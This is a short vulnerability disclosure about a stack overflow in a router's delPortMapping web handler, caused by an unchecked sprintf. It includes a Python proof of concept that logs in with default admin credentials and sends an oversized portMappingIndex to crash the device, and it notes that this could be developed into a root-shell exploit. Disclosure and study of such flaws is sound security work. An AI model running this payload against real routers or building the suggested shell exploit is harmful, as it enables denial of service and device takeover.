## Vulnerability details

In /gofrom/delPortMapping, the portMappingIndex is controlled by the user, and then copied to sPortMapIndex by sprintf. It is worth noting that there is no size check, which leads to a stack overflow vulnerability.

## Poc

```python
import requests

cmd  = b'portMappingIndex=' + b'A' * 0x3000

url = b"http://192.168.2.2/login/Auth"
payload = b"http://192.168.2.2/goform/delPortMapping/?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()
```

You can see that the router crashed, and finally you can write an exp to get a root shell
